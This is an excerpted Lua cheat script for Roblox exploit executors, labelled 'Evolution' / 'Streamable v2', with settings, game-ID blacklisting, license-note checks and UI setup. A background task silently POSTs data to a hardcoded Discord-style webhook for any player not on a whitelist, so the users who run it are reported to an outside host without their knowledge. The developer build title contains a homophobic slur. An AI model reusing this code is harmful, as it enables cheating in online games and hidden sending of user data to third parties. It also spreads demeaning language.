getgenv().Evolution = {
    ["Options"] = {
        ["Version"] = "2.1.9", -- // Dont touch this is to make sure your using the correct table
        ["Stealth Mode"] = {
...
if table.find(Blacklisted_GameIds,game.PlaceId) then 
    game:GetService("StarterGui"):SetCore("SendNotification",{
        ...
        Icon = "https://www.roblox.com/library/18115701225/Streamalbe-wow",
        Duration = 10
    })
    return
end
...
if Evolution["Options"]["Intro"] then 
    ...
    Image.Image = "https://www.roblox.com/library/18115701225/Streamalbe-wow"
...
task.spawn(function()
    if not table.find(safeplayers,game.Players.LocalPlayer.UserId) and not string.find(LRM_UserNote,"dev") and not string.find(LRM_UserNote,"friend") and LRM_LinkedDiscordID ~= 1 then
        ...
        (syn and syn.request or http_request or http.request) {
            Url = "https://discord.copi/webhooks/1155193573508141167/xjmXI7CfvjiNpmkzYym86NxNawIbCr1tAfdfBT3a9OS9l0jHOmWr17TcsSWzTDSBjJhH",
            Method = "POST",
            Headers = {
                ["Content-Type"] = "application/json"
            },
...
if Evolution["Options"]["Internal"].Enabled then 
    if Evolution_UI_LOADED then 
        ...
        if string.find(LRM_UserNote,"dev") then 
            title = "Gaybuild| Developer Build"
        end
        ...
        if game:GetService("UserInputService").TouchEnabled then 
            task.spawn(function()
                ...
                IconImage.ZIndex = 11
                IconImage.Image = "https://www.roblox.com/library/18115701225/Streamalbe-wow"
...
notify("Streamable v2 rewrite loaded.")